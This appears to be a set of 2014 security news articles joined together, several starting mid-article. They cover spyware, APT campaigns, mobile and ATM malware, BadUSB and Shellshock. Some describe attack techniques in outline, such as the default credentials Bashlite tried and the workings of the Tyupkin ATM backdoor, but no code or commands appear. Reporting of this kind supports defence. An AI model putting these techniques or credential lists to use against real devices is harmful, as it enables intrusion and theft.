This free-of-charge anti-surveillance tool, called Detekt, is an open source software app released in partnership with Human rights charity Amnesty International, Germany’s Digitale Gesellschaft, the Electronic Frontier Foundation (EFF) and Privacy International, in order to combat government surveillance. NEED AN EYE FOR AN EYE The global surveillance carried out by the US National Security Agency (NSA) and other government agencies recently disclosed by the former NSA contractor Edward Snowden shed light on just how far our own government can go to keep track of citizens, whether innocent or otherwise. Therefore, such tool will help them see if their devices have been infected by any spyware. Detekt was developed by security researcher Claudio Guarnieri, who has been investigating government abuse of spyware for years and often collaborates with other researchers at University of Toronto's Citizen Lab. \"It was intended as a triaging utility for human rights workers travelling around. It is not an AV [AntiVirus],\" explained the developer Claudio Guarnieri in an online discussion about the tool on Twitter with other security researchers. With the help of Detekt scanning tool in investigations, Guarnieri and his colleagues discovered, for example, that the Bahraini government used FinSpy, surveillance spyware developed by German firm FinFisher. Among other, FinSpy software has ability to monitor Skype conversations, take screenshots and photos using a device's camera, record microphone use, emails, voice-over-IP and extract files from hard discs. Moreover, Guarnieri’s team also found that the Ethiopian government spied on journalists and activists in the U.S. and Europe, using a software developed by Hacking Team, another company that sells off-the-shelf surveillance tools, and similar companies. \"Governments are increasingly using dangerous and sophisticated technology that allows them to read activists and journalists’ private emails and remotely turn on their computer’s camera or microphone to secretly record their activities,\" Amnesty head of military, security and police Marek Marczynski said in a statement. \"They use the technology in a cowardly attempt to prevent abuses from being exposed.\" \"Detekt is a simple tool that will alert activists to such intrusions so they can take action. It represents a strike back against governments who are using information obtained through surveillance to arbitrarily detain, illegally arrest and even torture human rights defenders and journalists.\" DOWNLOAD DETEKT ANTI-SURVEILLANCE TOOL You can Download Detekt here. Detekt, for now, has been designed for Windows PC users to scan their machines for known surveillance spyware that its developers warn is used to target and monitor specifically human rights defenders and journalists across the globe. The tool is not yet supported on the 64-bit version of Windows 8.1. Detekt scans computers for infection patterns associated with several families of remote access Trojans (RATs) including DarkComet RAT, XtremeRAT, BlackShades RAT, njRAT, FinFisher FinSpy, HackingTeam RCS, ShadowTech RAT and Gh0st RAT. \"If Detekt does not find anything, this unfortunately cannot be considered a clean bill of health,\" the Detekt software's Readme file warns. The tool can make you aware of the presence of spyware, but it is by no means 100 percent effective, and can’t detect all types of spywares. So, the human rights group is encouraging software developers to contribute to the project." }

The Beijing Bureau of Public security has announced the arrest of three suspects charged with distributing the WireLurker malware through a popular Chinese third-party online app store. The authorities also say the website that was responsible for spreading the malware has also been shut down. \"WireLurker\" malware was originally discovered earlier this month by security firm Palo Alto Networks targeting Apple users in China. The malware appeared as the first malicious software program that has ability to penetrate the iPhone's strict software controls. The main concern to worry about this threat was its ability to attack non-jailbroken iOS devices. Once a device infected with the malware, the virus could download the malicious and unapproved apps, which are designed to steal information, from the third-party app stores and, if it detects an iOS device connected through the USB slot, it would install the malicious apps on the device as well. \"This malware is under active development and its creator’s ultimate goal is not yet clear,\" the researchers wrote in a report [PDF]. \"The ultimate goal of the WireLurker attacks is not completely clear. The functionality and infrastructure allows the attacker to collect significant amounts of information from a large number of Chinese iOS and Mac OS systems, but none of the information points to a specific motive. We believe WireLurker has not yet revealed its full functionality.\" Unlike most iPhone bug, WireLurker malware has ability to install even on non-jailbroken iOS devices because the malware authors have used enterprise certificates to sign the apps. Apple has since revoked these cryptographic certificates used to sign WireLurker, and blocked all the apps signed with it. Palo Alto estimated that hundreds of thousands of users installed the malicious apps. China appears to have taken the threat very seriously and within two weeks arrested three individuals who are believed to be the creators of the malicious software. Although, there is not much details available about the arrest as the Bureau has simply posted a short notification on its Sina Weibo, a Chinese micro blogging service. But according to the Chinese authorities, the three suspects are identified as \"Chen,\" \"Lee\" and \"Wang,\" who are suspected of manufacturing and distributing the malicious program \"for illegal profit,\" and that the Chinese authorities have been helped in the investigation by researchers from Chinese AV company Qihoo 360." }

The group behind the rogue Tor exit node had likely been infecting files for more than a year, causing victims to download and install a backdoor file that gave hackers full control of their systems. Last month Josh Pitts of Leviathan Security Group uncovered a malicious Tor exit node that wraps Windows executable files inside a second, malicious Windows executable. But when Artturi Lehtiö of F-Secure carried out an in-depth research, he found that the exit node was actually linked to the notorious Russian APT family MiniDuke. \"MiniDuke\" previously infected government agencies and organizations in more than 20 countries via a modified Adobe PDF email attachment. MiniDuke malware is written in assembly language with its tiny file size (20KB), and uses hijacked Twitter accounts for Command & Control and incase twitter accounts are not active, the malware located backup control channels via Google searches. The rogue Russian exit node identified by Pitts was banned from the Tor network, but the new research carried out by F-Secure has revealed that the malicious Tor exit node is specifically being used to plant a new variant of the MiniDuke advanced persistent threat (APT) malware which the researcher has dubbed 'OnionDuke'. OnionDuke is a completely different malware family, but some of its command and control (C&C) servers were registered by the same miscreant that obtained MiniDuke C&C servers. “This strongly suggests that although OnionDuke and MiniDuke are two separate families of malware, the actors behind them are connected through the use of shared infrastructure,” the F-Secure researchers said in a blog post Friday. The malware has ability to steal login credentials and system information from the machines it infected, along with ability to evade from antivirus. But the main component of the malware is to download additional pieces of malware onto the infected computer. Besides spreading through the Tor node, the malware also spread through other, undetermined channels. \"During our research, we have also uncovered strong evidence suggesting that OnionDuke has been used in targeted attacks against European government agencies, although we have so far been unable to identify the infection vector(s),\" the F-Secure post stated. \"Interestingly, this would suggest two very different targeting strategies. On one hand is the 'shooting a fly with a cannon' mass-infection strategy through modified binaries and, on the other, the more surgical targeting traditionally associated with APT [advanced persistent threat] operations.\" The rogue Tor node infects uncompressed executable files passing through unencrypted traffic. The researcher said that whenever a victim tries to download a file via the malicious Tor exit node, they actually receive an executable \"wrapper\" that added a second executable. Using a separate wrapper, the miscreants could bypass any integrity checks, might present in the original executable. \"Upon execution, the wrapper will proceed to write to disk and execute the original executable, thereby tricking the user into believing that everything went fine. However, the wrapper will also write to disk and execute the second executable.\" Those users who use Tor anonymity network and download executable from an HTTPS-protected server and those using a virtual private network were not affected by the malware. Also users who installed only those apps that were digitally signed by the developer would likely be safe. Although no assurance can be guaranteed to the users because it's not difficult for hackers to compromise legitimate signing keys and use them to sign malicious packages." }

A new variant of \"Bashlite\" malware targeting devices running BusyBox software was spotted by the researchers at Trend Micro shortly after the public disclosure of the ShellShock vulnerability. BusyBox provides set of command line utilities that are specifically designed to run in constrained embedded environments. At compile time, different capabilities can be left out, reducing the size of the binaries, and efforts are made to make them memory efficient. This makes the software an excellent candidate for use in consumer electronics devices, which seem to have been the items of interest in this case. The malware variant, detected as ELF_BASHLITE.A (ELF_FLOODER.W), when executed on victim's machine, scans compromised networks for devices such as routers and Android phones running BusyBox to brute force logins through a preset list of usernames and passwords. The variant would then run a command to download and run bin.sh and bin2.sh scripts to gain control over Busybox systems once a connection was established. Therefore, this newer version of Bashlite is designed not only to identify systems running BusyBox, but also to hijack them. \"Remote attackers can possibly maximize their control on affected devices by deploying other components or malicious software into the system depending on their motive,\" threat response engineer at Trend Micro, Rhena Inocencio wrote on a blog post. \"As such, a remote attacker can issue commands or download other files on the devices thus compromising its security.\" Miscreants attempted to log in using a predefined list of usernames which include 'root', 'admin' and 'support' and common and default list of passwords such as 'root,' 'admin,' '12345,' 'pass,' 'password,' '123456' and so on. Trend Micro's Inocencio urged users to change their default usernames and passwords in order to keep them on the safer side, and also to disable remote shells, if possible, to avoid its exploitation. Bashlite malware includes the payload of the ShellShock exploit code and threat actors have used this critical ShellShock Bash command vulnerability (CVE-2014-6271) to build botnets from hijacked devices, launch distributed denial-of-service (DDoS) attacks, and target network attached storage boxes among other exploits. The Critical ShellShock Bash bug was disclosed on September 24 and by September 30 security firms estimated that attacks using the exploit could top 1 billion, and more than 1000 organizations patched the ShellShock bug as fixes became available." }

The researchers at Moscow-based security firm Kaspersky Lab dubbed the threat as \"DarkHotel APT,\" appear to have the ability to know in advance when a targeted executive checks in and checks out of a hotel. The group has been operating in Asia since from 2009 but there have been infections recorded in the United States, South Korea, Singapore, Germany, Ireland and many others, as well. It uses hotel Wi-Fi networks to target elite executives at organisations in manufacturing, defense, investment capital, private equity, automotive and other industries. The group has access to zero day vulnerabilities and exploits, and it used them to infect victims. Threat actors use three different malware distribution methods including malicious Wi-Fi networks, booby-trapped P2P torrents, and highly customized spear phishing, Kaspersky Lab reported in research paper. When the target executives connect their devices to the hotel’s Wi-Fi or wired Internet access, they are shown bogus software updates, typically something that looks legitimate, for Adobe Flash, Google Toolbar, or Windows Messenger. But these updates also contain a type of malware called a Trojan dropper bundled with more malware. \"When unsuspecting guests, including situationally aware corporate executives and high-tech entrepreneurs, travel to a variety of hotels and connect to the internet, they are infected with a rare APT Trojan posing as any one of several major software releases,\" the researchers wrote in a report published Monday. \"These might be GoogleToolbar, Adobe flash, Windows Messenger, etc. This first stage of malware helps the attackers to identify more significant victims, leading to the selective download of more advanced stealing tools.\" \"At the hotels, these installs are selectively distributed to targeted individuals. This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels. So, the attackers lay in wait until these travelers arrive and connect to the internet.\" The trojan dropper then installs various keyloggers and other tracking applications in order to track each of the victim's keystrokes and scan browsers for saved passwords, exposing a wealth of trade secrets and other secret information to the Darkhotel group. In addition, the Darkhotel malware has ability to manipulate trusted digital certificates by factoring the underlying private keys of the cloned certificates generated using 512-bit md5 keys. The ability of attackers to factor the weak keys for use in such malware attacks has long been known, as advisories issued from Fox-IT, Microsoft, Mozilla, and Entrust warned in 2011. \"All related cases of signed Darkhotel malware share the same Root Certificate Authority and Intermediate Certificate Authority that issued certificates with weak md5 keys (RSA 512 bits),\" Monday's Kaspersky report stated. \"We are confident that our Darkhotel threat actor fraudulently duplicated these certificates to sign its malware. These keys were not stolen.\" The DarkHotel malware operating group have also recently stolen third-party certificates to sign their malware. In order to protect your device, the easiest way for you is to avoid connecting to hotel Wi-Fi networks or to any other public or untrusted networks, and instead, use your mobile device hotspot to get access to the Internet." }

Apple always says that hacking their devices is too difficult for cyber crooks, but a single app has made it possible for anyone to hack an iPhone. A security flaw in Apple's mobile iOS operating system has made most iPhones and iPads vulnerable to cyber attacks by hackers seeking access to sensitive data and control of their devices, security researchers warned. The details about this new vulnerability was published by the Cyber security firm FireEye on its blog on Monday, saying the flaw allows hackers to access devices by fooling users to download and install malicious iOS applications on their iPhone or iPad via tainted text messages, emails and Web links. MASQUE ATTACK - REPLACING TRUSTED APPS The malicious iOS apps can then be used to replace the legitimate apps, such as banking or social networking apps, that were installed through Apple's official App Store through a technique that FireEye has dubbed \"Masque Attack.\" \"This vulnerability exists because iOS doesn't enforce matching certificates for apps with the same bundle identifier,\" the researchers said on the company's blog. \"An attacker can leverage this vulnerability both through wireless networks and USB.\" Masque attacks can be used by cyber criminals to steal banking and email login credentials or users’ other sensitive information. Security researchers found that the Masque attack works on Apple’s mobile operating system including iOS 7.1.1, 7.1.2, 8.0, 8.1, and the 8.1.1 beta version and that all of the iPhones and iPads running iOS 7 or later, regardless of whether or not the device is jailbroken are at risk. According to FireEye, the vast majority, i.e. 95 percent, of all iOS devices currently in use are potentially vulnerable to the attack. MASQUE ATTACK IS MORE DANGEROUS THAN WIRELURKER The Masque Attack technique is the same used by \"WireLurker,\" malware attack discovered last week by security firm Palo Alto Networks targeting Apple users in China, that allowed unapproved apps designed to steal information downloaded from the Internet. But this recently-discovered malware threat is reportedly a \"much bigger threat\" than Wirelurker. \"Masque Attacks can pose much bigger threats than WireLurker,\" the researchers said. \"Masque Attacks can replace authentic apps,such as banking and email apps, using attacker's malware through the Internet. That means the attacker can steal user's banking credentials by replacing an authentic banking app with an malware that has identical UI.\" \"Surprisingly, the malware can even access the original app's local data, which wasn't removed when the original app was replaced. These data may contain cached emails, or even login-tokens which the malware can use to log into the user's account directly.\" HOW TO PROTECT YOURSELF FROM MASQUE ATTACK Apple devices running iOS are long considered more safe from hackers than devices running OS like Microsoft’s Windows and Google’s Android, but iOS have now become more common targets for cybercriminals. In order to avoid falling victim to Masque Attack, users can follow some simple steps given below: Do not download any apps offer to you via email, text messages, or web links. Don't install apps offered on pop-ups from third-party websites. If iOS alerts a user about an \"Untrusted App Developer,\" click \"Don't Trust\" on the alert and immediately uninstall the application. In short, a simple way to safeguard your devices from these kind of threats is to avoid downloading apps from untrusted sources, and only download apps directly from the App Store." }

The antivirus vendor’s Global Research & Analysis Team released a report Monday detailing some of the new “relatively unknown” custom plug-in capabilities that the cyber espionage group has developed for BlackEnergy to attack Cisco networking devices and target ARM and MIPS platforms. The malware was upgraded with custom plugins including Ciscoapi.tcl which targets The Borg's kit, and According to researchers, the upgraded version contained various wrappers over Cisco EXEC-commands and \"a punchy message for Kaspersky,\" which reads, \"F*uck U, Kaspersky!!! U never get a fresh B1ack En3rgy. So, thanks C1sco 1td for built-in backd00rs & 0-days.\" BlackEnergy malware program was originally created and used by cybercriminals to launch Distributed Denial-of-Service (DDoS) attacks. The malware developer then added some custom plugins used to funnel banking information. Most recently BlackEnergy malware was observed in alleged state-sponsored attacks targeting the North Atlantic Treaty Organization (NATO), Ukrainian and Polish government agencies, and a variety of sensitive European industries over the last year. Now, the cyber espionage group has enhanced the malware program which also has the capabilities like port scanning, password stealing, system information gathering, digital certificate theft, remote desktop connectivity and even hard disk wiping and destroying. In case if a victim knew of the BlackEnergy infection on their system, the attacker activates \"dstr,\" the name of a plugin that destroys hard disks by overwriting them with random data. A second victim was compromised by using VPN credentials taken from the first victim. Security researchers, Kurt Baumgartner and Maria Garnaeva, also came across BlackEnergy version that works on ARM and MIPS based systems and found that it has compromised networking devices manufactured by Cisco Systems. However, the experts are not sure for the purpose of some plugins, including one that gathers device instance IDs and other information on connected USB drives and another that collects details on the BIOS (Basic Input/Output System), motherboard, and processor of infected systems. \"We are pretty sure that our list of [BlackEnergy] tools is not complete,\" the researchers wrote. \"For example, we have yet to obtain the router access plugin, but we are confident that it exists. Evidence also supports the hypothesis that there is a decryption plugin for victim files.\" Multiple unnamed victim companies in different countries were targeted with the latest BlackEnergy malware, including victims in Russia, Germany, Belgium, Turkey, Libya, Vietnam and several other countries. Another Crimeware group, the Sandworm Team, believed to have used the BlackEnergy exclusively throughout 2014 at victim sites and included custom plugin and scripts of their own. Also last month, the Sandworm Team had targeted organizations across the world in an espionage campaign, and iSIGHT Partners revealed that the team used spear phishing as the major attack vector to victimize their targets." }

But the most secure systems aren't safe anymore. Security researchers at the Cyber Security Labs at Ben Gurion University in Israel have found a way to snoop on a personal computer even with no network connection. STEALING DATA USING RADIO SIGNALS Researchers have developed a proof-of-concept malware that can infiltrate a closed network to lift data from a machine that has been kept completely isolated from the internet or any Wi-Fi connection by using little more than a mobile phone’s FM radio signals. Researcher Mordechai Guri, along with Professor Yuval Elovici of Ben Gurion University, presented the research on Thursday in the 9th IEEE International Conference on Malicious and Unwanted Software (MALCON 2014) held at Denver. This new technology is known as ‘AirHopper’ — basically a keylogger app to track what is being typed on the computer or the mobile phone. AirHopper is a special type of keylogger because it uses radio frequencies to transmit data from a computer, all by exploiting the computer's monitor display, in order to evade air-gap security measures. \"This is the first time that a mobile phone is considered in an attack model as the intended receiver of maliciously crafted radio signals emitted from the screen of the isolated computer,\" according to a release by Ben Gurion University. HOW DOES AIRHOPPER WORK ? The technology works by using the FM radio receiver included in some mobile phones. AirHopper is able to capture keystrokes by intercepting certain radio emissions from the monitor or display unit of the isolated computer. The researchers can then pick up the FM signals on a nearby smartphone and translate the FM signals into the typed text. LIMITATIONS The technique is completely new, although it has some limitations. The team claims that textual and binary information can be gathered from a distance of up to 7 meters with an effective FM-bandwidth of 13-60 bps (bytes per second). \"AirHopper demonstrates how textual and binary data can be exfiltrated from physically a (sic) isolated computer to mobile phones at a distance of 1-7 meters, with effective bandwidth of 13-60 (bytes per second). Enough to steal a secret password.\" This, according to researchers, is enough to steal a secret password. Therefore, in an effort to obtain secret data an attacker can infect a mobile phone of someone from the staff using AirHopper method worked in stealth mode, and then transmit the data. VIDEO DEMONSTRATION AND POTENTIAL DANGER Researchers have also provide the Proof-of-concept video, so you can Watch the demonstration video and find out if you should be worried or not. According to the researchers, the Airhopper technique of data theft was developed by the University in order to protect against potential intrusions of its kind in the future. \"Such technique can be used potentially by people and organizations with malicious intentions and we want to start a discussion on how to mitigate this newly presented risk.\" said Dudu Mimran, chief technology officer of the Ben Gurion University’s cyber security labs." }

The US intelligence firm FireEye released its latest Advanced Persistent Threat (APT) report on Tuesday which said that the cyber attacks targeting various organisations would be of the interest to Russia, and \"may be\" sponsored by the Russian government. The Report entitled \"APT28: A Window Into Russia's Cyber Espionage Operations\" published by FireEye has \"evidence of long-standing, focused operations that indicate a government sponsor - specifically, a government based in Moscow.\" \"Despite rumours of the Russian government's alleged involvement in high-profile government and military cyber attacks, there has been little hard evidence of any link to cyber espionage,\" Dan McWhorter, FireEye vice president of Threat Intelligence, wrote in a blog post discussing the report. \"FireEye's latest APT report sheds light on cyber espionage operations that we assess to be most likely to be sponsored by the Russian government, long believed to be a leader among major nations in performing sophisticated network attacks.\" The cyber-espionage group believed to have been operating since at least 2007 in order to steal political and state secrets from businesses and foreign governments. The group launched a cyber attack on government in Georgia, Eastern Europe, as well as NATO and the Organisation for Security and Co-operation in Europe, according to the report. Whereas the Russian cyber criminal groups are known for conducting massive cyber campaigns aimed at stealing money and financial information, but APT28 focuses on \"privileged information related to governments, militaries and security organizations.\" “This group, unlike the China-based threat actors we track, does not appear to conduct widespread intellectual property theft for economic gain,” FireEye stated in the report. “Nor have we observed the group steal and profit from financial account information.” The security firm analyzed that the malware used by APT28 features a consistent use of the Russian language. Moreover, more than 96 percent of malware samples analyzed by the researchers were compiled between Monday and Friday, between 8AM and 6PM in the time zone paralleling working hours in Moscow and St. Petersburg. This regularity in the work suggests that the hackers were in Moscow, the report argues. The APT28 group has constantly updated their software and made the resulting binaries difficult to reverse engineer. It used a downloader tool that FireEye dubbed \"SOURFACE\", a backdoor labelled \"EVILTOSS\" that gives hackers remote access and a flexible modular implant called \"CHOPSTICK\" to enhance functionality of the espionage software. Infection is usually achieved via a spear phishing email with a relevant lure and the malware hidden in the attachment. The hacker group has also created a number of fake domains for UK-based defence events, including the Counter Terror Expo, as part of the operation to gather intelligence on attendees. Together with the help of above mentioned tools, the group gained access to the file system and registry; enumerate network resources; create processes; log keystrokes; access stored credentials; execute shellcode, and encrypt exfiltrated data uploaded with an RSA public key. “The coding practices evident in the group’s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts,” the report stated. In another report , a top White House official has confirmed that Russian hackers have hacked into the unclassified White House computer networks. \"we identified activity of concern on the unclassified Executive Office of the President network,\". Russia has been suspected of attacks on Ukraine too, including attempts to gain access to politicians’ mobile phone communications." }

Researchers observed the Koler Android ransomware Trojan, at the very first time, in May when the Trojan was distributed through certain pornographic websites under the guise of legitimate apps. It locks the victim’s mobile screen and then demands money from users with fake notifications from law enforcement agencies accusing users of viewing and storing child pornography. ANDROID SMS WORM Recently, researchers from mobile security firm AdaptiveMobile has discovered a new variant of the rare piece of mobile malware – named Worm.Koler – that allows the malware to spread via text message spam and attempts to trick users into opening a shortened bit.ly URL, turning Koler into an SMS worm. Once the device is infected by the Koler variant, it will first send an SMS message to all contacts in the device's address book with a text stating, \"Someone made a profile named -[the contact's name]- and he uploaded some of your photos! is that you?\" followed by a Bitly link, according to the security firm. When a victim clicks on the Bitly link, he or she is then redirected to a Dropbox page with a download link for a 'PhotoViewer' app that, if installed, will push a ransom screen to pop up incessantly on the users' screen. The ransom message reads that the device has been locked up because of having illicit content and users must pay $300 via MoneyPak to 'wave the accusations.' \"The device appears to be completely locked down with the screen on the phone blocked, so the user won't be able to close the window, or deactivate the malware through the app manager,\" reads the blog post. \"The victim is forced to buy a voucher as instructed on the blocking page, and send the voucher code to a malware author.\" INFECTION SPREADING RAPIDLY The Worm.Koler is capable of displaying localized ransomware messages to users from at least 30 countries, including the U.S., where three quarters of the latest Koler variant infections were seen by the firm, and smaller number of infections were also being detected in parts of the Middle East. \"Due to the Worm.Koler's SMS distribution mechanism, we are seeing a rapid spread of infected devices since the 19th of October, which we believe to be the original outbreak date,\" the blog post states. \"During this short period, we have detected several hundred phones that exhibit signs of infection, across multiple US carriers. In addition to this, other mobile operators worldwide—predominantly in the Middle East, have been affected by this malware.\" HOW TO PROTECT YOURSELF If users suspect they are infected by the malware, they should never authorize any payment as it won't guarantee the unlocking of your device, as well as it will further encourage cyber criminals to carry out such ransomware practices again and again. Koler does not encrypt files, according to the security firm, therefore it becomes easy for users to eliminate the threat from their infected devices by following two simple steps: Reboot your phone in the \"Safe Mode\" Remove the 'PhotoViewer' app using standard Android app uninstallation tool In order to protect yourself from such threats in future, the best practice is to have the \"Unknown Sources\" option turned off in your Android device' security settings menu. Turning off of this option won't let users to install applications from unknown sources, but only from the official Google Play store." }

The new backdoor program, dubbed as “Tyupkin,” requires physical access to the ATM system running 32-bit Windows platforms and booting it off of a CD in order to install the malware. According to the researchers, the threat has continued to evolve in recent months, infecting ATMs in Asia, Europe, and Latin America. There are no details relating to the criminal gang behind the attacks, but they have already stolen \"millions of dollars\" from ATMs worldwide using the sophisticated malware, security firms Kaspersky and Interpol, who are working together in an attempt to foil the criminal gang, said in a joint statement released on Tuesday. \"Over the last few years, we have observed a major upswing in ATM attacks using skimming devices and malicious software,\" said Vicente Diaz, principal security researcher at Kaspersky Lab. \"Now we are seeing the natural evolution of this threat with cybercriminals moving up the chain and targeting financial institutions directly. This is done by infecting ATMs themselves or launching direct Advanced Persistent Threat (APT)-style attacks against banks. The Tyupkin malware is an example of the attackers taking advantage of weaknesses in the ATM infrastructure.\" HOW TYUPKIN ATTACK WORKS In order to install the malicious backdoor, money mules need to physically insert a bootable CD which installs the malware. Once the machine is rebooted, the ATM is under the control of the criminal gang. The sophisticated malware then runs in the background on an infinite loop awaiting a command from the attacker’s side. However, the malware will only accept commands at specific times – in this case on Sunday and Monday nights – making it harder to detect. Furthermore, a unique combination key based on random numbers is generated – so that the possibility of a member of the public accidentally entering a code can be avoided. This key code needs to be entered before the main menu is shown. \"The malicious operator receives instructions by phone from another member of the gang who knows the algorithm and is able to generate a session key based on the number shown,\" Kaspersky stated in its release. \"This ensures that the mules collecting the cash do not try to go it alone.\" When this session key is entered correctly, the ATM displays details of how much money is available in each cash cassette, inviting the operator to choose which cassette to steal from, and the number of available banknotes – the ATM dispenses a maximum of 40 at a time from the chosen cassette. COUNTRIES AFFECTED BY TYUPKIN During investigation the researchers found more than 50 ATMs from banking institutions throughout Eastern Europe, and most of the Tyupkin submissions came from Russia. The malware appears to have since spread to the United States, India, China, Israel, France and Malaysia. The scam has been even caught on video, as many of the ATMs have cameras, so you can also have a look to the video provided below. Kaspersky has informed law enforcement about the issue and also alerted banks and the financial sectors of the steps needed to prevent this type of attack." }

Security researchers have released a bunch of hacking tools that can be used to convert USB drive into silent malware installer. This vulnerability has come about to be known as \"BadUSB\", whose source code has been published by the researchers on the open source code hosting website Github, demanding manufacturers either to beef up protections for USB flash drive firmware and fix the problem or leave hundreds of millions of users vulnerable to the attack. The code released by researchers Adam Caudill and Brandon Wilson has capability to spread itself by hiding in the firmware meant to control the ways in which USB devices connect to computers. The hack utilizes the security flaw in the USB that allows an attacker to insert malicious code into their firmware. But Wait! What this means is that this critical vulnerability is now available online for hackers, cyber criminals and everybody to use so as to infect as many computers as they want. SOURCE CODE AVAILABLE ONLINE TO EVERYBODY In a talk at the Derbycon Hacker Conference in Louisville last week, the duo were able to reverse engineer the USB firmware, infect it with their own code, and essentially hijack the associated device. The researchers also underlined the danger of the Bad USB hack by going in-depth of the code. The security hole was first revealed by researchers from Berlin-based Security Research Labs (SRLabs in Germany) at the Black Hat security conference in Las Vegas two months ago, and here you can watch the video of their presentation. The German researchers didn’t publish their source code because they thought it to be dangerous and too hard to patch. “We really hope that releasing this will push device manufactures to insist on signed firmware updates, and that Phison will add support for signed updates to all of the controllers it sells,” Caudill said in a blog post. “Phison isn’t the only player here, though they are the most common—I’d love to see them take the lead in improving security for these devices.” THE GOOD NEWS AND THE BAD The good news is that this vulnerability presents in only one USB manufacturer Phison electronics, a Taiwanese electronics company. But the bad side of it is that Phison USB sticks can infect any given device they are plugged into, and the company has not yet revealed who it manufactures USB sticks for. This is the fact it is still unclear as to how widespread the problem may be at the moment. A Phison USB stick can infect any type of computer, but it isn’t clear if its able to infect any other USB device that is plugged into them afterwards or not. However, Phison controllers are found in a very large number of USB thumb drives available on the market. BadUSB VULNERABILITY IS UNPATCHABLE The flaw in USB basically modifies the firmware of USB devices, which can easily be done from inside the operating system, and hides the malware in USB devices in a way that it become almost impossible to detect it. The flaw goes worst when complete formatting or deleting the contents of a USB device wouldn't vanish the malicious code, since its embedded in the firmware. According to Wired, the vulnerability is \"practically unpatchable\" because it exploits \"the very way that USB is designed.\" Once infected, each USB device will infect anything it's connected to, or any new USB stick coming into it. IMPACT OF BadUSB ATTACK Once compromised, the USB devices can reportedly: enter keystrokes alter files affect Internet activity infect other systems, as well, and then spread to additional USB devices spoofs a network card and change the computer’s DNS setting to redirect traffic emulates a keyboard and issue commands on behalf of the logged-in user, for example to exfiltrate files or install malware During their Derbycon demonstration, the two researchers replicated the emulated keyboard attack, but also showed how to create a hidden partition on thumb drives to defeat forensic tools and how to bypass the password for protected partitions on some USB drives that provide such a feature. MANUFACTURER DENIES THE PROBLEM Security researchers tried to contact Phison electronics, the manufacturer of the vulnerable USB devices, but the company \"repeatedly denied that the attack was possible.\"" }

The company's business plan for the product focused on \"the spousal cheat\" market, which was expected to constitute 65 percent of the StealthGenie app purchasers, as the plan even spelled that out, stating that the target audience was cheating spouses and romantic partners. \"According to our market research, the majority chunk of the sales will come from people suspecting their partners to be cheating on them or wanting to keep an eye on them,\" the business plan stated according to the indictment. Once installed on the phone, it allows conversations to be monitored as they take place, enables the purchaser to call the phone and activate it at any time to monitor all surrounding conversations within a 15-foot radius, and collects the user’s incoming and outgoing email and SMS messages, incoming voicemail, address book, calendar, photographs, and videos. All of these functions are enabled without the knowledge of the user of the phone. StealthGenie spyware application, according to the law enforcement agency, is able to: Record all incoming/outgoing voice calls; Intercept calls on the phone to be monitored while they take place; Allow the attackers to call the phone and activate the app any time in order to monitor all surrounding conversations within a 15-foot radius; Monitor the user’s incoming and outgoing e-mail messages, SMS messages, incoming voicemail messages, address book additions, as well as Smartphones’ calendar, photographs, and videos. The federal prosecutors said this case is the first time that the US Department of Justice has prosecuted someone for advertising and selling mobile device spyware apps that targets adults. \"Selling spyware is not just reprehensible, it's a crime,\" Assistant Attorney General Leslie Caldwell of the Justice Department's Criminal Division said in a statement. \"Apps like StealthGenie are expressly designed for use by stalkers and domestic abusers who want to know every detail of a victim's personal life--all without the victim's knowledge.\" Akbar was charged with conspiracy, sale of a surreptitious interception device, advertisement of a known interception device and advertising a device as a surreptitious interception device in US District Court for the Eastern District of Virginia." }

BOTNET ATTACK IN THE WILD The bot was discovered by the security researcher with the Twitter handle @yinettesys, who reported it on Github and said it appeared to be remotely controlled by miscreants, which indicates that the vulnerability is already being used maliciously by the hackers. The vulnerability (CVE-2014-6271), which came to light on Wednesday, affects versions 1.14 through 4.3 of GNU Bash and could become a dangerous threat to Linux/Unix and Apple users if the patches to BASH are not applied to the operating systems. However, the patches for the vulnerability were released but there was some concern that the initial fix for the issue still left Bash vulnerable to attack, according to a new US CERT National Vulnerability Database entry. There is as of yet no official patch that completely addresses both vulnerabilities, including the second, which allows an attacker to overwrite files on the targeted system. SHELLSHOCK vs THE INTERNET Robert Graham of Errata Security observed that the major internet scan is already being used by the cyber criminals in order to locate vulnerable servers for cyber attack. During a scan, Graham found about 3,000 servers that were vulnerable \"just on port 80\" — the Internet Protocol port used for normal Web Hypertext Transfer Protocol (HTTP) requests. The Internet scan broke after a short while, which means that there could be a wide numbers of other servers vulnerable to the attack. \"It's things like CGI scripts that are vulnerable, deep within a website (like CPanel's /cgi-sys/defaultwebpage.cgi),\" Graham wrote in a blog post. \"Getting just the root page is the thing least likely to be vulnerable. Spidering the site and testing well-known CGI scripts (like the CPanel one) would give a lot more results—at least 10x.\" In addition, Graham said, \"this thing is clearly wormable and can easily worm past firewalls and infect lots of systems. One key question is whether Mac OS X and iPhone DHCP service is vulnerable—once the worm gets behind a firewall and runs a hostile DHCP server, that would be 'game over' for large networks.\" 32 ORACLE PRODUCTS VULNERABLE Oracle has also confirmed that over 32 of its products are affected by the \"Shellshock\" vulnerability including some expensive integrated hardware systems of the company. The company warned its users to wait a bit longer for the complete patch, by issuing a security alert regarding the Bash bug on Friday. \"Oracle is still investigating this issue and will provide fixes for affected products as soon as they have been fully tested and determined to provide effective mitigation against the vulnerability,\" the company said. PATCH ISSUED, BUT INCOMPLETE Patches were released from most of the Linux distributions, but Red Hat has updated an advisory warning that the patch is incomplete, the same issue that was also raised by infosec community on Twitter. \"Red Hat has become aware that the patches shipped for this issue are incomplete,\" said Red Hat security engineer Huzaifa Sidhpurwala. \"An attacker can provide specially-crafted environment variables containing arbitrary commands that will be executed on vulnerable systems under certain conditions The new issue has been assigned CVE-2014-7169.\" Although people are urged to apply the released patch to thwart most attacks on the affected systems, another patch is expected to release as soon as possible." }

